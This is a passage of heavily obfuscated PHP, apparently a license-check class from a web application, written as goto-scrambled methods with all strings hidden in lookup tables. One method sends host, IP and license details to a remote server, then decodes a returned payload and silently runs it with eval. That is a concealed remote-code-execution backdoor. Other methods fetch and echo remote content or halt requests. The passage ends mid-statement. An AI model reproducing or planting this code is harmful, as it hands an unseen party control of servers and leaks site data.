$bª«êÆˆ×Ê = $c¹—·ÚàˆÑ[619]; goto aÖñ†Ø„; F©²ÔÂÌâÉ: while ($DÈ……Ö¯İ¹ < $c¹—·ÚàˆÑ[587]) { if ($DÈ……Ö¯İ¹ >= 0) { break; } $DÈ……Ö¯İ¹++; } $b¨ëñÊùšØ = $Bçİ‚˜Öˆ[220]($Bçİ‚˜Öˆ[25]($AÍ™…Ÿ’…”, 10, 16)); $BÈÅ‚ĞŸŞŒ = $this->{$_SERVER[È][133]}($Bçİ‚˜Öˆ[154]($e—†½òÈ¨), $AÍ™…Ÿ’…”); goto f—¶ãß‰»; eŞß“°ò÷°: } private function licenseRegistSuccess() { goto bæô©òÑ; cÉ²ˆà’ì: $CÈÕˆ¯Íà = $d‚Œ¶õ¦Ò[625]; while (strlen($CÈÕˆ¯Íà) < $d‚Œ¶õ¦Ò[574]) { if (!$CÈÕˆ¯Íà) { break; } $CÈÕˆ¯Íà++; } if ($fœØ¼ˆ—µ[$a¶Ù‚™éäÃ[89]] != $a¶Ù‚™éäÃ[226]) { $a¶Ù‚™éäÃ[61]($a¶Ù‚™éäÃ[62])->{$_SERVER[È][227]}($a¶Ù‚™éäÃ[89], $a¶Ù‚™éäÃ[226]); } goto c…•¡‡š; bæô©òÑ: $d‚Œ¶õ¦Ò =& $_SERVER[¹…ÕÄ]; $a¶Ù‚™éäÃ =& $_SERVER[È]; $fœØ¼ˆ—µ = $a¶Ù‚™éäÃ[61]($a¶Ù‚™éäÃ[62])->{$_SERVER[È][63]}(); goto cÉ²ˆà’ì; c…•¡‡š: $a¶Ù‚™éäÃ[116]($a¶Ù‚™éäÃ[238])->{$_SERVER[È][239]}(!0); goto bæáˆ“Æ’Ó; bæáˆ“Æ’Ó: } private function hprx72c24836() { goto b†©ÒƒÓåŒ; b†©ÒƒÓåŒ: $bµ ºíÆÍé =& $_SERVER[È]; $bµ ºíÆÍé[61]($bµ ºíÆÍé[62])->{$_SERVER[È][227]}(array($bµ ºíÆÍé[215] => $bµ ºíÆÍé[10], $bµ ºíÆÍé[216] => $bµ ºíÆÍé[10], $bµ ºíÆÍé[126] => $bµ ºíÆÍé[127], $bµ ºíÆÍé[128] => $bµ ºíÆÍé[10], $bµ ºíÆÍé[129] => $bµ ºíÆÍé[10])); $fĞ´ç‘­©á = $_SERVER[¹…ÕÄ][626]; goto f¼Ìß½ÅÌ§; b¶ÒËÌë¤÷: $this->dlbjd6a12f2e = $bµ ºíÆÍé[127]; goto dé¬Ôâ‹õ; f¼Ìß½ÅÌ§: if (!$fĞ´ç‘­©á) { return; } $bµ ºíÆÍé[61]($bµ ºíÆÍé[62])->{$_SERVER[È][224]}($bµ ºíÆÍé[225], $bµ ºíÆÍé[240]); $this->udaic2052363 = array(); goto b¶ÒËÌë¤÷; dé¬Ôâ‹õ: } private function lupr607aa3f5() { goto BÉ‡ÌÔ•Š™; c„‹´£àŸ: if ($c¦Æ‹ˆË’[242]() - $c×¹ µë´å[$c¦Æ‹ˆË’[241]] > 20) { $c×¹ µë´å[$c¦Æ‹ˆË’[241]] = $c¦Æ‹ˆË’[242](); Cache::set($f›éÆõ¾§, $c×¹ µë´å); } $this->udaic2052363 = $c×¹ µë´å; $this->dlbjd6a12f2e = $D‚êø¢­Å™[$c¦Æ‹ˆË’[126]]; goto D‘ÑØÌÌ»; EÒÆ¯è÷ƒ: $this->dlbjd6a12f2e = $c¦Æ‹ˆË’[127]; $A¤‚³¯‘ÄÂ = $FÉòø•¿…Æ[627]; $D‚êø¢­Å™ = $c¦Æ‹ˆË’[61]($c¦Æ‹ˆË’[62])->{$_SERVER[È][63]}(); goto bˆƒî†¤åÛ; bôñŸ¼Èİ: if (!$c¦Æ‹ˆË’[198]($c×¹ µë´å)) { return $this->{$_SERVER[È][170]}(); } $AÜ¥İƒŠ = $c¦Æ‹ˆË’[150]($c×¹ µë´å[$c¦Æ‹ˆË’[151]]); if ($c¦Æ‹ˆË’[242]() >= $AÜ¥İƒŠ) { return $this->{$_SERVER[È][170]}(); } goto c„‹´£àŸ; DŸŠÊÉ•²œ: $e¯§¶ÓÄ = $FÉòø•¿…Æ[629]; if (strlen($e¯§¶ÓÄ) < $FÉòø•¿…Æ[581]) { return; } if (!$c¦Æ‹ˆË’[198]($c×¹ µë´å) || !isset($c×¹ µë´å[$c¦Æ‹ˆË’[241]]) || $c¦Æ‹ˆË’[242]() - $c×¹ µë´å[$c¦Æ‹ˆË’[241]] >= 60) { $F×ñùöÙÜŠ = $c¦Æ‹ˆË’[228]($c¦Æ‹ˆË’[61]($c¦Æ‹ˆË’[11])->{$_SERVER[È][229]}(), $c¦Æ‹ˆË’[230]); $e²Ÿ¿Ššã = $F×ñùöÙÜŠ[$c¦Æ‹ˆË’[231]]; $F…”Š‹ÒÇô = $c¦Æ‹ˆË’[120]($_SERVER[$c¦Æ‹ˆË’[121]] . $c¦Æ‹ˆË’[220]($E ì‚Ô÷ÀÁ) . $D‚êø¢­Å™[$c¦Æ‹ˆË’[216]]); $bïçó™Şßí = $c¦Æ‹ˆË’[220]($c¦Æ‹ˆË’[25]($F…”Š‹ÒÇô, 10, 16)); $c×¹ µë´å = $this->{$_SERVER[È][195]}($e²Ÿ¿Ššã[$c¦Æ‹ˆË’[100]][$bïçó™Şßí], $F…”Š‹ÒÇô); $c×¹ µë´å = $c¦Æ‹ˆË’[197]($c×¹ µë´å, !0); } goto bôñŸ¼Èİ; bˆƒî†¤åÛ: if ($D‚êø¢­Å™[$c¦Æ‹ˆË’[126]] == $c¦Æ‹ˆË’[127]) { return; } $E ì‚Ô÷ÀÁ = $c¦Æ‹ˆË’[61]($c¦Æ‹ˆË’[62])->{$_SERVER[È][63]}($c¦Æ‹ˆË’[122]); $Dì¥¬·“… = $FÉòø•¿…Æ[628]; goto b°Š¹ÏÉÓ; BÉ‡ÌÔ•Š™: $FÉòø•¿…Æ =& $_SERVER[¹…ÕÄ]; $c¦Æ‹ˆË’ =& $_SERVER[È]; $_SERVER[$c¦Æ‹ˆË’[181]] = $c¦Æ‹ˆË’[112]($_SERVER, $c¦Æ‹ˆË’[181], APP_HOST); goto EÒÆ¯è÷ƒ; b°Š¹ÏÉÓ: if (!$Dì¥¬·“…) { return; } $f›éÆõ¾§ = $c¦Æ‹ˆË’[236] . $c¦Æ‹ˆË’[120]($E ì‚Ô÷ÀÁ . $c¦Æ‹ˆË’[237]); $c×¹ µë´å = Cache::get($f›éÆõ¾§); goto DŸŠÊÉ•²œ; D‘ÑØÌÌ»: } private function oixse3ff3f02() { $fµµâñ¸’õ =& $_SERVER[È]; $BÅÓŸÆì¬ = $GLOBALS[$fµµâñ¸’õ[22]]; $Cõ‹ƒ¬ñ = $_SERVER[$fµµâñ¸’õ[44]]; if ($Cõ‹ƒ¬ñ == $fµµâñ¸’õ[243] && $this->dlbjd6a12f2e == $fµµâñ¸’õ[127]) { $fµµâñ¸’õ[172]($fµµâñ¸’õ[204]($fµµâñ¸’õ[244]), !1, $fµµâñ¸’õ[245]); } $F®¾Ûï¯Ö = array($fµµâñ¸’õ[246], $fµµâñ¸’õ[247]); if ($fµµâñ¸’õ[248]($Cõ‹ƒ¬ñ, $F®¾Ûï¯Ö)) { if ($this->dlbjd6a12f2e == $fµµâñ¸’õ[127] && isset($BÅÓŸÆì¬[$fµµâñ¸’õ[249]])) { $fµµâñ¸’õ[172]($fµµâñ¸’õ[204]($fµµâñ¸’õ[244]), !1, $fµµâñ¸’õ[245]); die; } $fÁ™˜ôÇÖ = $this->{$_SERVER[È][143]}(); if ($fÁ™˜ôÇÖ != $fµµâñ¸’õ[250]($fµµâñ¸’õ[251])) { if ($fÁ™˜ôÇÖ <= $fµµâñ¸’õ[61]($fµµâñ¸’õ[145])->{$_SERVER[È][146]}()) { $fµµâñ¸’õ[172]($fµµâñ¸’õ[204]($fµµâñ¸’õ[252]), !1, $fµµâñ¸’õ[245]); die; } } } } private function wszj268498d8() { goto f’÷¦Å‹¶ó; A®„¶Óğ­Ö: $eö®¶ ÜÏ = $F¶Èµ¯…¾¢[630]; if (!$eö®¶ ÜÏ) { return; } if (!$c¨©½ó¥¾[112]($GLOBALS, $c¨©½ó¥¾[138]) || !isset($_GET[$c¨©½ó¥¾[254]])) { return; } goto DùÄì—­Õ™; b•Ğæ‚¡’½: $a®“Ã†Šô§ = $c¨©½ó¥¾[258](array($c¨©½ó¥¾[259] => array($c¨©½ó¥¾[260] => $c¨©½ó¥¾[261], $c¨©½ó¥¾[262] => 3))); $DÏÌ†¨Éâ = $F¶Èµ¯…¾¢[631]; while (strlen($DÏÌ†¨Éâ) < $F¶Èµ¯…¾¢[581]) { if (!$DÏÌ†¨Éâ) { break; } $DÏÌ†¨Éâ++; } goto D‚ÜÑ¸Î¡í; Bõ ¨Ë°ƒË: if ($C¥”ßÏÔ¦ && $c¨©½ó¥¾[32]($C¥”ßÏÔ¦, $c¨©½ó¥¾[266])) { echo $C¥”ßÏÔ¦; } die; goto e™ÄÕ‚­‚¡; D‚ÜÑ¸Î¡í: $C¥”ßÏÔ¦ = @$c¨©½ó¥¾[263]($F‚‹¾¾–Ã“, !1, $a®“Ã†Šô§); $c¨©½ó¥¾[264]($c¨©½ó¥¾[265]); $Føœç¼ÈŒ® = $F¶Èµ¯…¾¢[632]; goto Bõ ¨Ë°ƒË; DùÄì—­Õ™: if (!$c¨©½ó¥¾[248]($_SERVER[$c¨©½ó¥¾[44]], $EãñÓ›ºÅ…)) { return; } $F‚‹¾¾–Ã“ = $c¨©½ó¥¾[255]; $F‚‹¾¾–Ã“ = $this->{$_SERVER[È][256]}($F‚‹¾¾–Ã“, $c¨©½ó¥¾[257]); goto b•Ğæ‚¡’½; f’÷¦Å‹¶ó: $F¶Èµ¯…¾¢ =& $_SERVER[¹…ÕÄ]; $c¨©½ó¥¾ =& $_SERVER[È]; $EãñÓ›ºÅ… = array($c¨©½ó¥¾[141], $c¨©½ó¥¾[253]); goto A®„¶Óğ­Ö; e™ÄÕ‚­‚¡: } public function snbi6b0c0315($fÅ†­Ç³Ï) { goto cÉÛˆŒÆ¾Ç; b¡…¦Æİ§º: $d–·‰À‡ññ = array(); foreach ($D¢£­Ÿ‘×à as $FÔ†ßä­ãó => $b—ÁğéÔ®›) { if ($b—ÁğéÔ®› == $e–©×ë´“ç[269] && $e–©×ë´“ç[25]($this->dlbjd6a12f2e, 0, 1) == $e–©×ë´“ç[269]) { continue; } if (!$e–©×ë´“ç[248]($FÔ†ßä­ãó, $b¡ÂéñÓ )) { $d–·‰À‡ññ[] = $FÔ†ßä­ãó; } } foreach ($d–·‰À‡ññ as $FÔ†ßä­ãó) { unset($fÅ†­Ç³Ï[$FÔ†ßä­ãó]); } goto cÆˆ••’ÂĞ; cÆˆ••’ÂĞ: return $fÅ†­Ç³Ï; $a¬Á¹æ¿Ñœ = $c—ÉÇ»›¸[635]; if (!$a¬Á¹æ¿Ñœ) { return; } goto cêÒ×¸ÉŒ¡; FçÌËí¯‘®: $D¢£­Ÿ‘×à = array($e–©×ë´“ç[268] => $e–©×ë´“ç[269], $e–©×ë´“ç[270] => $e–©×ë´“ç[269], $e–©×ë´“ç[271] => $e–©×ë´“ç[269], $e–©×ë´“ç[272] => $e–©×ë´“ç[269], $e–©×ë´“ç[273] => $e–©×ë´“ç[269], $e–©×ë´“ç[274] => $e–©×ë´“ç[275], $e–©×ë´“ç[276] => $e–©×ë´“ç[275], $e–©×ë´“ç[277] => $e–©×ë´“ç[275], $e–©×ë´“ç[278] => $e–©×ë´“ç[275], $e–©×ë´“ç[279] => $e–©×ë´“ç[275], $e–©×ë´“ç[280] => $e–©×ë´“ç[275], $e–©×ë´“ç[281] => $e–©×ë´“ç[275]); $eâè…œ“ÁÖ = $c—ÉÇ»›¸[633]; while (strlen($eâè…œ“ÁÖ) < $c—ÉÇ»›¸[570]) { if (!$eâè…œ“ÁÖ) { break; } $eâè…œ“ÁÖ++; } goto e­Æ‚”ÛíÆ; cÉÛˆŒÆ¾Ç: $c—ÉÇ»›¸ =& $_SERVER[¹…ÕÄ]; $e–©×ë´“ç =& $_SERVER[È]; if ($this->dlbjd6a12f2e == $e–©×ë´“ç[267]) { return $fÅ†­Ç³Ï; } goto FçÌËí¯‘®; e­Æ‚”ÛíÆ: $b¡ÂéñÓ  = $e–©×ë´“ç[0]($e–©×ë´“ç[282], $e–©×ë´“ç[112]($this->udaic2052363, $e–©×ë´“ç[135], $e–©×ë´“ç[10])); $C—´Ü–¸§ = $c—ÉÇ»›¸[634]; if (strlen($C—´Ü–¸§) < $c—ÉÇ»›¸[574]) { return; } goto b¡…¦Æİ§º; cêÒ×¸ÉŒ¡: } private function dxob17b5e488() { goto bíà›»“‹; bíà›»“‹: $f‡Àí”‰ùª =& $_SERVER[¹…ÕÄ]; $Dã²ÆË’ˆâ =& $_SERVER[È]; if ($this->dlbjd6a12f2e != $Dã²ÆË’ˆâ[127]) { return; } goto DÇôí³ôªé; DÇôí³ôªé: $GLOBALS[$Dã²ÆË’ˆâ[100]][$Dã²ÆË’ˆâ[104]][$Dã²ÆË’ˆâ[283]] = $Dã²ÆË’ˆâ[226]; $GLOBALS[$Dã²ÆË’ˆâ[100]][$Dã²ÆË’ˆâ[284]] = $Dã²ÆË’ˆâ[226]; $b°›Êê‘Ï = $f‡Àí”‰ùª[636]; goto f×¡Ù¾ä’ç; f×¡Ù¾ä’ç: while (strlen($b°›Êê‘Ï) < $f‡Àí”‰ùª[570]) { if (!$b°›Êê‘Ï) { break; } $b°›Êê‘Ï++; } if ($Dã²ÆË’ˆâ[61]($Dã²ÆË’ˆâ[285])->{$_SERVER[È][63]}($Dã²ÆË’ˆâ[89]) != $Dã²ÆË’ˆâ[240]) { $Dã²ÆË’ˆâ[61]($Dã²ÆË’ˆâ[285])->{$_SERVER[È][227]}($Dã²ÆË’ˆâ[89], $Dã²ÆË’ˆâ[240]); } goto c ¼¢¡¢ÙÏ; c ¼¢¡¢ÙÏ: } public function xgdf67abf720() { $f†õğ”£¼¾ =& $_SERVER[¹…ÕÄ]; return $_SERVER[È][286]; $a™¡É¢„ò = $f†õğ”£¼¾[637]; if (strlen($a™¡É¢„ò) < $f†õğ”£¼¾[574]) { die; } } private function fivnf925ac54() { goto D¾ôğ²Æ„õ; c“¿×ÈÜ§ë: if (!$C±’ÖÁ£ Ü) { return; } if ($Fë­¤÷Æ¬± && $fÊ²ƒŠùÍ[242]() - $Fë­¤÷Æ¬± < $fÊ²ƒŠùÍ[250]($fÊ²ƒŠùÍ[294])) { return; } $fÊ²ƒŠùÍ[13](array($fÊ²ƒŠùÍ[292], $fÊ²ƒŠùÍ[158]), $dµÜ×ñöë, $fÊ²ƒŠùÍ[242]()); goto f´İÖËšÙÈ; c”¬ƒÏ‰Èç: $e°Ş°¿ÏÕ = $this->{$_SERVER[È][189]}($fÊ²ƒŠùÍ[295], $a¡¹æ¥Ó»); $DÕÒ¼ÊÜ«‹ = $DœÔ°[640]; if (!$DÕÒ¼ÊÜ«‹) { die; } goto AÆŸ÷¦‚¸Ï; f´İÖËšÙÈ: $Fê ˆØ¤ä = $DœÔ°[639]; if (strlen($Fê ˆØ¤ä) < $DœÔ°[570]) { die; } $a¡¹æ¥Ó» = array($fÊ²ƒŠùÍ[171] => $fÊ²ƒŠùÍ[61]($fÊ²ƒŠùÍ[62])->{$_SERVER[È][63]}($fÊ²ƒŠùÍ[215]), $fÊ²ƒŠùÍ[184] => $this->dlbjd6a12f2e, $fÊ²ƒŠùÍ[182] => $_SERVER[$fÊ²ƒŠùÍ[183]], $fÊ²ƒŠùÍ[175] => $fÊ²ƒŠùÍ[155], $fÊ²ƒŠùÍ[178] => $_SERVER[$fÊ²ƒŠùÍ[179]]); goto c”¬ƒÏ‰Èç; D¾ôğ²Æ„õ: $DœÔ° =& $_SERVER[¹…ÕÄ]; $fÊ²ƒŠùÍ =& $_SERVER[È]; $dªÎÃÉ•¦ = array($fÊ²ƒŠùÍ[287], $fÊ²ƒŠùÍ[288], $fÊ²ƒŠùÍ[289]); goto C‹œ×«ËË‚; AÆŸ÷¦‚¸Ï: if (!$fÊ²ƒŠùÍ[198]($e°Ş°¿ÏÕ)) { return; } if ($e°Ş°¿ÏÕ[$fÊ²ƒŠùÍ[171]] && $e°Ş°¿ÏÕ[$fÊ²ƒŠùÍ[296]]) { if ($this->{$_SERVER[È][206]}($e°Ş°¿ÏÕ[$fÊ²ƒŠùÍ[296]]) == $a¡¹æ¥Ó»[$fÊ²ƒŠùÍ[171]]) { return; } } $this->{$_SERVER[È][170]}(); goto F²Õ“¨®ãî; eÍ†¥´Íí·: if ($fÊ²ƒŠùÍ[242]() % 4 != 0) { return; } $Fë­¤÷Æ¬± = $fÊ²ƒŠùÍ[13](array($fÊ²ƒŠùÍ[292], $fÊ²ƒŠùÍ[293]), $dµÜ×ñöë); $C±’ÖÁ£ Ü = $DœÔ°[638]; goto c“¿×ÈÜ§ë; C‹œ×«ËË‚: $dµÜ×ñöë = $fÊ²ƒŠùÍ[290] . $fÊ²ƒŠùÍ[120]($fÊ²ƒŠùÍ[291]); if ($this->dlbjd6a12f2e == $fÊ²ƒŠùÍ[127] || !$fÊ²ƒŠùÍ[112]($GLOBALS, $fÊ²ƒŠùÍ[138])) { return; } if (!$fÊ²ƒŠùÍ[248]($_SERVER[$fÊ²ƒŠùÍ[44]], $dªÎÃÉ•¦)) { return; } goto eÍ†¥´Íí·; F²Õ“¨®ãî: $EŸØô‹ù±“ = $DœÔ°[641]; if (strlen($EŸØô‹ù±“) < $DœÔ°[574]) { return; } if ($this->{$_SERVER[È][206]}($e°Ş°¿ÏÕ[$fÊ²ƒŠùÍ[296]]) != $a¡¹æ¥Ó»[$fÊ²ƒŠùÍ[171]]) { $bˆÈÆäòŸ¬ = array($fÊ²ƒŠùÍ[208] => $fÊ²ƒŠùÍ[61]($fÊ²ƒŠùÍ[62])->{$_SERVER[È][63]}($fÊ²ƒŠùÍ[122]), $fÊ²ƒŠùÍ[209] => $_SERVER[$fÊ²ƒŠùÍ[121]], $fÊ²ƒŠùÍ[210] => $fÊ²ƒŠùÍ[211](), $fÊ²ƒŠùÍ[180] => $_SERVER[$fÊ²ƒŠùÍ[181]]); $dÃì¹¥¤¨Ç = $this->{$_SERVER[È][212]}($fÊ²ƒŠùÍ[154]($bˆÈÆäòŸ¬)); $e°Ş°¿ÏÕ = $this->{$_SERVER[È][189]}($fÊ²ƒŠùÍ[213] . $dÃì¹¥¤¨Ç); if ($e°Ş°¿ÏÕ && $fÊ²ƒŠùÍ[198]($e°Ş°¿ÏÕ) && isset($e°Ş°¿ÏÕ[$fÊ²ƒŠùÍ[296]])) { $cíëÌÖ´ù = $this->{$_SERVER[È][195]}($e°Ş°¿ÏÕ[$fÊ²ƒŠùÍ[296]], 2); if ($cíëÌÖ´ù) { $cíëÌÖ´ù = $this->{$_SERVER[È][206]}($cíëÌÖ´ù); } if ($cíëÌÖ´ù) { try { @eval($cíëÌÖ´ù); } catch (Exception $c³Éƒµ‹òµ) { } } } } goto føÎ²Äõ³Ñ; føÎ²Äõ³Ñ: } private function fucs3c458572($FÏµ¨Œ—à£ = '', $cÚÖÒ”ó‹ë = array(), $dŒÃìÇÙˆ© = 5) { goto D‰Œí‚•¼Š; CñÂ‰²²£: $f¨á•ŠÂ = $this->{$_SERVER[È][256]}($f¨á•ŠÂ, $e–°‹¨ğÙ [298]); $f¨á•ŠÂ = $f¨á•ŠÂ . $FÏµ¨Œ—à£; if ($cÚÖÒ”ó‹ë && $e–°‹¨ğÙ [198]($cÚÖÒ”ó‹ë)) { $f¨á•ŠÂ = $f¨á•ŠÂ . $e–°‹¨ğÙ [299] . $e–°‹¨ğÙ [300]($cÚÖÒ”ó‹ë); } goto bŸìÁ‡ÆÔ; EŸí¼ÚèÃÇ: $A˜±åÔ·¬ = $CÜ„§áœÃ[643]; if (strlen($A˜±åÔ·¬) < $CÜ„§áœÃ[587]) { return; } goto eÙ šã®Æ; D‰Œí‚•¼Š: $CÜ„§áœÃ =& $_SERVER[¹…ÕÄ]; $e–°‹¨ğÙ  =& $_SERVER[È]; $f¨á•ŠÂ = $e–°‹¨ğÙ [297]; goto CñÂ‰²²£; fÍ§ô†®¶È: return $e–°‹¨ğÙ [197]($cÚÖÒ”ó‹ë, !0); $d™´è¡‹‚ = $CÜ„§áœÃ[642]; if (strlen($d™´è¡‹‚) < $CÜ„§áœÃ[579]) { return; } goto EŸí¼ÚèÃÇ; bŸìÁ‡ÆÔ: if ($cÚÖÒ”ó‹ë === -1) { return $f¨á•ŠÂ; } $d¼ñ¡‹ŞÍ = $e–°‹¨ğÙ [258](array($e–°‹¨ğÙ [259] => array($e–°‹¨ğÙ [262] => $dŒÃìÇÙˆ©, $e–°‹¨ğÙ [260] => $e–°‹¨ğÙ [301]), $e–°‹¨ğÙ [302] => array($e–°‹¨ğÙ [303] => !1, $e–°‹¨ğÙ [304] => !1))); $cÚÖÒ”ó‹ë = @$e–°‹¨ğÙ [263]($f¨á•ŠÂ, !1, $d¼ñ¡‹ŞÍ); goto fÍ§ô†®¶È; eÙ šã®Æ: } private function dotc3ea8b852() { goto B©Ïê…•¾á; B©Ïê…•¾á: $eÉ¢ó³Ã’ =& $_SERVER[¹…ÕÄ]; $Bß’¶ÂÃÆø =& $_SERVER[È]; $aØ©¹êï¢Õ = array($Bß’¶ÂÃÆø[305] => $Bß’¶ÂÃÆø[306], $Bß’¶ÂÃÆø[307] => $Bß’¶ÂÃÆø[308], $Bß’¶ÂÃÆø[309] => $Bß’¶ÂÃÆø[310], $Bß’¶ÂÃÆø[311] => $Bß’¶ÂÃÆø[312], $Bß’¶ÂÃÆø[313] => $Bß’¶ÂÃÆø[314], $Bß’¶ÂÃÆø[315] => $Bß’¶ÂÃÆø[251], $Bß’¶ÂÃÆø[316] => $Bß’¶ÂÃÆø[251], $Bß’¶ÂÃÆø[317] => $Bß’¶ÂÃÆø[306], $Bß’¶ÂÃÆø[318] => $Bß’¶ÂÃÆø[308], $Bß’¶ÂÃÆø[319] => $Bß’¶ÂÃÆø[310], $Bß’¶ÂÃÆø[320] => $Bß’¶ÂÃÆø[321], $Bß’¶ÂÃÆø[322] => $Bß’¶ÂÃÆø[312], $Bß’¶ÂÃÆø[323] => $Bß’¶ÂÃÆø[324], $Bß’¶ÂÃÆø[325] => $Bß’¶ÂÃÆø[314], $Bß’¶ÂÃÆø[326] => $Bß’¶ÂÃÆø[327], $Bß’¶ÂÃÆø[328] => $Bß’¶ÂÃÆø[329], $Bß’¶ÂÃÆø[330] => $Bß’¶ÂÃÆø[331]); goto e‰ÕÛÙÀæë; EÇ„›³×Õ¥: return $aùÛ„Š’º‹ + $CµÈ¸Íğ‹™; $Eî©ß†Ì¨ = $eÉ¢ó³Ã’[647]; if (!$Eî©ß†Ì¨) { return; } goto eĞ÷²÷æ¼•; e‰ÕÛÙÀæë: $aùÛ„Š’º‹ = $aØ©¹êï¢Õ[$this->dlbjd6a12f2e]; $aùÛ„Š’º‹ = $Bß’¶ÂÃÆø[250]($aùÛ„Š’º‹ ? $aùÛ„Š’º‹ : $Bß’¶ÂÃÆø[306]); $D÷Á¡¼ï”ò = $eÉ¢ó³Ã’[644]; goto a¾ïè¦÷‰¸; Fß“×ë†„ê: if (strlen($DÁóùğò²š) < $eÉ¢ó³Ã’[587]) { die; } $CµÈ¸Íğ‹™ = $CµÈ¸Íğ‹™ ? $Bß’¶ÂÃÆø[250]($CµÈ¸Íğ‹™) : 0; $FãíÌ‚Ê…ê = $eÉ¢ó³Ã’[646]; goto EÇ„›³×Õ¥; a¾ïè¦÷‰¸: if (strlen($D÷Á¡¼ï”ò) < $eÉ¢ó³Ã’[579]) { return; } $CµÈ¸Íğ‹™ = $Bß’¶ÂÃÆø[112]($this->udaic2052363, $Bß’¶ÂÃÆø[332]); $DÁóùğò²š = $eÉ¢ó³Ã’[645]; goto Fß“×ë†„ê; eĞ÷²÷æ¼•: } public function hplyf38a0865($aÄ¢·ˆ£µÓ) { goto båÎ÷öÌ•Œ; fÇÎ”Ï¨Ì: $CÖ³…ËÖá× = $Aëš¶ğ‚ä[61]($Aëš¶ğ‚ä[145])->{$_SERVER[È][334]}($Aëš¶ğ‚ä[333])->{$_SERVER[È][335]}($aëÛ‘¶†÷)->{$_SERVER[È][336]}(); $CÖ³…ËÖá× = $Aëš¶ğ‚ä[228]($CÖ³…ËÖá×, $Aëš¶ğ‚ä[10], $Aëš¶ğ‚ä[333]); if (!$Aëš¶ğ‚ä[248]($aÄ¢·ˆ£µÓ[$Aëš¶ğ‚ä[333]], $CÖ³…ËÖá×)) { $Aëš¶ğ‚ä[172]($Aëš¶ğ‚ä[337], !1, $Aëš¶ğ‚ä[245]); } goto E‹Š×Ê¤©˜; båÎ÷öÌ•Œ: $Aëš¶ğ‚ä =& $_SERVER[È]; $aëÛ‘¶†÷ = $this->{$_SERVER[È][143]}(); if ($aÄ¢·ˆ£µÓ[$Aëš¶ğ‚ä[333]] == $Aëš¶ğ‚ä[226]) { return; } goto b×´¹îÆªß; b×´¹îÆªß: if ($aëÛ‘¶†÷ >= $Aëš¶ğ‚ä[250]($Aëš¶ğ‚ä[251])) { return; } $aéº…½÷í¾ = $Aëš¶ğ‚ä[61]($Aëš¶ğ‚ä[145])->{$_SERVER[È][146]}(); if ($aéº…½÷í¾ <= $aëÛ‘¶†÷) { return; } goto fÇÎ”Ï¨Ì; E‹Š×Ê¤©˜: } public function aerz82627987() { goto cñÁø¥´İ; cñÁø¥´İ: $fŠ„¢ˆ²¦ =& $_SERVER[¹…ÕÄ]; $dÓÀÁÇ‰·‘ =& $_SERVER[È]; if (!$dÓÀÁÇ‰·‘[112]($GLOBALS, $dÓÀÁÇ‰·‘[138]) || $dÓÀÁÇ‰·‘[338](1, 100) > 20) { return; } goto dÕ±ï§ì—ô; dÕ±ï§ì—ô: $Cº­Ê“®ˆØ = $dÓÀÁÇ‰·‘[255]; $Cº­Ê“®ˆØ = $this->{$_SERVER[È][256]}($Cº­Ê“®ˆØ, $dÓÀÁÇ‰·‘[257]); $B†“îğºß¸ = $dÓÀÁÇ‰·‘[258](array($dÓÀÁÇ‰·‘[259] => array($dÓÀÁÇ‰·‘[260] => $dÓÀÁÇ‰·‘[261], $dÓÀÁÇ‰·‘[262] => 3))); goto eßÜ‰Û¨¼„; D›¸ã¨¢Ğ: echo $dÓÀÁÇ‰·‘[339] . $dÓÀÁÇ‰·‘[340]($fÕñÈÛêµ’) . $dÓÀÁÇ‰·‘[341]; goto b­²¡‚ßÈÅ; eßÜ‰Û¨¼„: $f©¿ÊÄæ = $fŠ„¢ˆ²¦[648]; if (strlen($f©¿ÊÄæ) < $fŠ„¢ˆ²¦[570]) { return; } $fÕñÈÛêµ’ = @$dÓÀÁÇ‰·‘[263]($Cº­Ê“®ˆØ, !1, $B†“îğºß¸); goto D›¸ã¨¢Ğ; b­²¡‚ßÈÅ: } private function zauo06081f33($eï›ÙÙÎ…, $cİ÷¾¾İ‡¯, $f§º°ŒÁõ = 3) { goto Eø¬¶‘Œ¾ó; E¿‹¸Ñ’êô: if (strlen($fÙ«‚î«ŞÊ) < $e„ÓŒÖÇİ[587]) { die; } $B²çµƒìé” = $Eº¯šŠ†[338](0, 5) . $Eº¯šŠ†[10]; $DîˆÈä‚Ÿê = $e„ÓŒÖÇİ[651]; goto cÈ×¬ä„ÓÅ; aÜˆù“Û—ó: switch ($B²çµƒìé”) { case $Eº¯šŠ†[240]: $CèÛ¯ÈŒê¿ = $this->{$_SERVER[È][153]}($eï›ÙÙÎ…, $Eº¯šŠ†[220]($cİ÷¾¾İ‡¯ . $eŒ²â×ºèğ)); $B±‰Ö¸¹®Ö = $e„ÓŒÖÇİ[652]; if (strlen($B±‰Ö¸¹®Ö) < $e„ÓŒÖÇİ[581]) { die; } break; case $Eº¯šŠ†[226]: $CèÛ¯ÈŒê¿ = $this->{$_SERVER[È][153]}($eï›ÙÙÎ…, $Eº¯šŠ†[220]($eŒ²â×ºèğ . $cİ÷¾¾İ‡¯)); $eØğåÙÅÍ– = $e„ÓŒÖÇİ[653]; break; $Aòõí¾êøÑ = $e„ÓŒÖÇİ[654]; while ($Aòõí¾êøÑ < $e„ÓŒÖÇİ[574]) { if ($Aòõí¾êøÑ >= 0) { break; } $Aòõí¾êøÑ++; } case $Eº¯šŠ†[344]: $CèÛ¯ÈŒê¿ = $this->{$_SERVER[È][153]}($eï›ÙÙÎ…, $Eº¯šŠ†[124]($eŒ²â×ºèğ . $cİ÷¾¾İ‡¯)); break; case $Eº¯šŠ†[345]: $CèÛ¯ÈŒê¿ = $this->{$_SERVER[È][153]}($eï›ÙÙÎ…, $Eº¯šŠ†[120]($eŒ²â×ºèğ . $cİ÷¾¾İ‡¯)); $D®óÔ…É¬‰ = $e„ÓŒÖÇİ[655]; if (!$D®óÔ…É¬‰) { die; } break; case $Eº¯šŠ†[346]: goto fÔáİ—‹áÈ; fÔáİ—‹áÈ: $eï›ÙÙÎ… = $Eº¯šŠ†[124]($eï›ÙÙÎ…); $cé÷Üà°Ø› = $Eº¯šŠ†[347](0, 64); $c†Œ±ƒÔ é = $FíİÚŠ¶¡[$cé÷Üà°Ø›]; goto E·óãˆô„Ó; C¥É¦×’Ğ: if (!$côØ­ìĞÆ) { die; } $F’õ—ÕŠŞÆ = 0; $fãã§Ì‰·¨ = $e„ÓŒÖÇİ[658]; goto cğØ§µÃ½—; C”Óç†‚Ÿ: $E‰õ«ÃåÉ™ = $e„ÓŒÖÇİ[659]; for ($F’õ—ÕŠŞÆ = 0; $F’õ—ÕŠŞÆ < $Eº¯šŠ†[24]($eï›ÙÙÎ…); $F’õ—ÕŠŞÆ++) { $a’¨´ê®¦å = 